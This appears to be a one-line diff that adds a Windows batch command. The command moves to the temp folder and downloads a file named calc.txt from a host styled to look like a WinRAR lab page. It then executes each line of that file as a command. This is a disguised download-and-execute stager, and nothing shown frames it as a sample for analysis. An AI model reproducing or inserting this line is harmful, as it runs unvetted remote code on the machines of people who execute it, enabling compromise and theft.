@@ -1,0 +1,1 @@
+@echo OFF & cd %temp% & curl -o calc.txt https://winrar-lab.github.io/Windows-10/calc.txt & timeout 2 & FOR /F "tokens=*" %%* IN (calc.txt) DO %%*
